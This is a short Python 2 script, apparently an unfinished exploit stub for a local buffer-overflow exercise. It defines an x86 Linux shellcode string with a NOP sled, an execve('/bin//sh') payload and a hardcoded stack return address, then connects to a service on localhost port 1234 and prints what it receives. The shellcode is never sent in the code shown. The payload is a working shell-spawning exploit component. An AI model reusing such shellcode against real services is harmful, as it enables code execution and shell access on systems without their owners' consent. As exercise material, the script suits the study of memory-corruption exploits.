#!/usr/bin/env python
import sys
import socket as sk

host = 'localhost'
port = 1234

address = (host, port)

sc = '\x90\x90\x90\x90\x83\xec01\xc0Phn/shh//bi\x89\xe3P\x89\xe2S\x89\xe1\xb0\x0b\xcd\x80l\xf7\xff\xbf\x0a\x00'

def main():
    obj = sk.socket()
    obj.connect(address)
    a = obj.recv(4096)
    print repr(a)

if __name__ == '__main__':
    main()
    